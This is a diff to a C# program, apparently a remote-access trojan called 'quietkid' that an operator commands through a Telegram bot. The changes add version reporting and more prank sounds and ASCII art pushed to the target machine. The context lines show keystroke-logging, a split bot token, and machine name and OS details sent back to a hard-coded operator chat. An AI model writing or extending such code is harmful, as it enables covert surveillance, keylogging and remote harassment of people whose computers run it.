@@ -10,6 +10,7 @@ using Telegram.Bot.Types.InputFiles;
 using File = System.IO.File;
 using System.Threading;
 using System.Diagnostics;
+using System.Reflection;
 using System.Collections.Generic;
 using Keystroke.API;
 using System.Media;
@@ -18,6 +19,7 @@ namespace quietkid
 {
     static class Data
     {
+
         public enum ConversationStatus
         {
             awaiting,
@@ -30,12 +32,11 @@ namespace quietkid
             sound,
             ascii
         }
+
     }
     public class Action
     {
-        
-        const string version = "4.0.0";
-
+        static string projectVersion;
         static string keyLog = "";
         static bool isLogging = false;
         static string currentDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
@@ -45,6 +46,11 @@ namespace quietkid
         [STAThread]
         static async Task Main()
         {
+            {
+                Assembly assembly = Assembly.GetExecutingAssembly();
+                FileVersionInfo fileVersionInfo = FileVersionInfo.GetVersionInfo(assembly.Location);
+                projectVersion = fileVersionInfo.ProductVersion;
+            }
             Bot = new TelegramBotClient(Secure.tokenNose.ToString() + Secure.tokenTail);
 
             Bot.OnMessage += BotOnMessageReceived;
@@ -90,7 +96,7 @@ namespace quietkid
                 case "/basic":
                     await Bot.SendTextMessageAsync(
                        chatId: Secure.me,
-                       text: $"FDS v{version}\nMachine {Environment.MachineName}:\nOS version: {Environment.OSVersion}\nTime since FDS launch: {watch.ElapsedMilliseconds / 1000}s"
+                       text: $"FDS v{projectVersion}\nMachine {Environment.MachineName}:\nOS version: {Environment.OSVersion}\nTime since FDS launch: {watch.ElapsedMilliseconds / 1000}s"
                     );
                     break;
                 case "/finder":
@@ -174,45 +180,87 @@ namespace quietkid
                     switch (status)
                     {
                         case Data.ConversationStatus.ascii:
+                            if (message.Text == "list")
+                            {
+                                await Bot.SendTextMessageAsync(
+                                    chatId: Secure.me,
+                                     text: "shrek, toucan, patrick, patrickBack, amogus, deez, putin, hacking, sus"
+                                );
+                                break;
+                            }
                             switch (message.Text)
                             {
                                 case "shrek":
-                                    await InsertPlain(Properties.Resources.shrek);
+                                    await InsertPlain(ASCII.Shrek);
                                     break;
                                 case "toucan":
-                                    await InsertPlain(Properties.Resources.toucan);
+                                    await InsertPlain(ASCII.Toucan);
                                     break;
                                 case "patrick":
-                                    await InsertPlain(Properties.Resources.patrick);
+                                    await InsertPlain(ASCII.Patrick);
                                     break;
                                 case "patrickBack":
-                                    await InsertPlain(Properties.Resources.patrickBack);
+                                    await InsertPlain(ASCII.PatrickIsBack);
                                     break;
                                 case "amogus":
-                                    await InsertPlain(Properties.Resources.amogus);
+                                    await InsertPlain(ASCII.Amogus);
+                                    break;
+                                case "deez":
+                                    await InsertPlain(ASCII.DeezNuts);
+                                    break;
+                                case "putin":
+                                    await InsertPlain(ASCII.Putin);
+                                    break;
+                                case "hacking":
+                                    await InsertPlain(ASCII.Hacking);
+                                    break;
+                                case "sus":
+                                    await InsertPlain(ASCII.Sus);
                                     break;
                                 default:
                                     throw new Exception("Unknown ascii");
                             }
                             break;
                         case Data.ConversationStatus.sound:
+                            // TODO:
+                            // Resource list with all strings
+                            if (message.Text == "list")
+                            {
+                                await Bot.SendTextMessageAsync (
+                                    chatId: Secure.me,
+                                     text: "amogus, fart, aaaa, bomb, boom, bruh, error, hehe, woo"
+                                );
+                                break;
+                            }
                             SoundPlayer audio = new SoundPlayer();
                             switch (message.Text)
                             {
-                                case "among":
-                                    audio = new SoundPlayer(Properties.Resources.among);
+                                case "amogus":
+                                    audio = new SoundPlayer(Sounds.Sus);
                                     break;
                                 case "fart":
-                                    audio = new SoundPlayer(Properties.Resources.fartWithReverb);
+                                    audio = new SoundPlayer(Sounds.Fart);
                                     break;
-                                case "baba":
-                                    audio = new SoundPlayer(Properties.Resources.bababooey);
+                                case "aaaa":
+                                    audio = new SoundPlayer(Sounds.Aaaa);
                                     break;
-                                case "kudasai":
-                                    audio = new SoundPlayer(Properties.Resources.kudasai);
+                                case "bomb":
+                                    audio = new SoundPlayer(Sounds.Bomb);
+                                    break;
+                                case "boom":
+                                    audio = new SoundPlayer(Sounds.Boom);
                                     break;
                                 case "bruh":
-                                    audio = new SoundPlayer(Properties.Resources.bruh);
+                                    audio = new SoundPlayer(Sounds.Bruh);
+                                    break;
+                                case "error":
+                                    audio = new SoundPlayer(Sounds.Error);
+                                    break;
+                                case "hehe":
+                                    audio = new SoundPlayer(Sounds.Hehe);
+                                    break;
+                                case "woo":
+                                    audio = new SoundPlayer(Sounds.Woo);
                                     break;
                                 default:
                                     throw new Exception("Unknown sound");
@@ -430,5 +478,6 @@ namespace quietkid
             );
             Environment.Exit(1);
         }
+
     }
 }
